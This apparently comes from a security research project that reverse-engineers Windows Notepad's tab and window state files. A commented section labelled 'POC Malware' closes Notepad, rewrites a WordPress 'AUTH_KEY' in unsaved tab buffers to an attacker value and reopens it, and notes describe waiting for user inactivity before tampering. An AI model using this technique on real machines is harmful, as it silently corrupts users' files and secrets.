// See https://aka.ms/new-console-template for more information
using NotepadStateLibrary;
using System.Diagnostics;
using System.Formats.Asn1;
using System.Globalization;
using System.Text;

Console.WriteLine("********** Starting *********");


string folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\WindowState");

foreach (var path in Directory.EnumerateFiles(folder, "*.bin"))
{
    byte[] o = new byte[0];

    using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
    {
        byte[] data = new byte[fileStream.Length];
        fileStream.Read(data);

        if (data.Length > 0)
        {
            Console.WriteLine("Processing WindowState - {0}", Path.GetFileName(path));
            NPWindowState np = new NPWindowState(data, Path.GetFileName(path));

            List<Guid> curList = new List<Guid>();
            foreach (var b in np.Tabs)
            {
                curList.Add(new Guid(b));
            }

            string addGuid = "66e70d99-c296-44e0-bd96-b2a190f6173b";
            curList.Add(new Guid(addGuid));

            List<byte[]> newList = new List<byte[]>();
            foreach (var g in curList)
            {
                newList.Add(g.ToByteArray());
            }

            np.WriteTabList(newList);

            o = np.bytes;
        }
    }
    File.WriteAllBytes(path, o);
}



//https://www.mking.net/blog/programmatically-determining-whether-a-windows-user-is-idle

//https://www.fluxbytes.com/csharp/how-to-know-if-a-process-exited-or-started-using-events-in-c/

//POC Malware.
//Poll for Notepad to open
//Poll for a specific file to be opened by filename
//Poll for that file to be set to Unsaved
//Check for inactivity timer
//Make change
//Profit???

#region malware
//bool wasOpen = false;

//if (Process.GetProcessesByName("notepad").Length > 0)
//{
//    wasOpen = true;
//    foreach (var p in Process.GetProcessesByName("notepad"))
//    {
//        p.CloseMainWindow();
//        p.Close();
//    }
//}

//string folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState");

//foreach (var path in Directory.EnumerateFiles(folder, "*.bin"))
//{
//    byte[] o = new byte[0];

//    using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
//    {
//        byte[] data = new byte[fileStream.Length];
//        fileStream.Read(data);

//        if (data.Length > 0)
//        {
//            Console.WriteLine("Processing TabState - {0}", Path.GetFileName(path));
//            NPTabState np = new NPTabState(data, Path.GetFileName(path));


//            if (np.TypeFlag <= 1)
//            {
//                //var s = np.Content;
//                //s[208] = 32;
//                //o = np.WriteContent(s);

//                string c = np.ContentString;
//                int start = c.IndexOf("define('AUTH_KEY',");
//                int end = c.Substring(start).IndexOf(");") + 2;
//                var n = Encoding.Unicode.GetBytes(c.Remove(start, end).Insert(start, "define('AUTH_KEY',         '->-&3du!!^iN|U[57nG({}6&compromisedQ-,NXiN5Uv7txxX469`8v-dCYYf,H');"));
//                o = np.WriteContent(n);

//                //File.WriteAllBytes(path, o);
//            }
//        }
//    }
//    File.WriteAllBytes(path, o);
//}

//if (wasOpen)
//{
//    Process.Start("notepad.exe");
//}
#endregion

//folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\WindowState");

//foreach (var path in Directory.EnumerateFiles(folder, "*.bin"))
//{
//    byte[] b = File.ReadAllBytes(path);
//    if (b.Length > 0)
//    {

//        NPWindowState np = new NPWindowState(b, Path.GetFileName(path));
//        Console.WriteLine(Path.GetFileName(path));
//        Console.WriteLine(np.NumberTabs.ToString());

//        if (np.CRC32Calculated.SequenceEqual(np.CRC32Stored))
//        {
//            Console.WriteLine("OK");
//        }
//        else
//        {
//            Console.WriteLine("FAIL");
//        }
//        Console.WriteLine("*****************************************");
//    }
//}

#region 
//NPTabState npWrite = new NPTabState(Encoding.Unicode.GetBytes("Test"), [0x0], [0x0], new List<UnsavedBufferChunk>(), [0x1]);
//File.WriteAllBytes("check.bin", npWrite.bytes);

//NPTabState npWrite0 = new NPTabState(0, 25, 4, 4, [0x1], [0x0], [0x0]);
//File.WriteAllBytes("0.bin", npWrite0.bytes);


//byte[] sha = {
//    0x27, 0x09, 0x60, 0x35, 0x22, 0x8A, 0xA1, 0xB4, 0x47, 0x98, 0x4D, 0x7E, 0x1D, 0xFD, 0x10, 0xB9,
//    0xA8, 0x57, 0x16, 0xDA, 0x29, 0xA4, 0xEF, 0xFB, 0x65, 0x02, 0xE4, 0xA6, 0xDE, 0x26, 0x7A, 0xB3,
//};

//byte[] c = {
//    0x74, 0x00, 0x65, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x73, 0x00, 0x74, 0x00, 0x74, 0x00,
//    0x65, 0x00, 0x73, 0x00, 0x74, 0x00, 0x73, 0x00,
//};

//NPTabState npWrite1 = new NPTabState(0, [0x01], @"C:\Users\Reversing\Desktop\Test.txt", 12, [0x05], [0x01], new DateTime(2024, 4, 16, 11, 55, 24), sha, 0, 0, [0x1], [0x0], [0x0], c);
//File.WriteAllBytes("saved.bin", npWrite1.bytes);
#endregion

//NPTabState np = new NPTabState(File.ReadAllBytes(@"C:\Users\Reversing\AppData\Local\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState\f62c642a-29ba-443a-baef-d3185c5e7910.bin"));
//Console.WriteLine(Encoding.Unicode.GetString(np.Content));
//File.WriteAllBytes(@"C:\Users\Reversing\AppData\Local\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState\98c4291f-34a1-4ffe-b195-72e297d4ff60.bin",np.WriteContent(Encoding.Unicode.GetBytes("How are you?")));


Console.WriteLine("********** Completed **********");
//Console.ReadLine();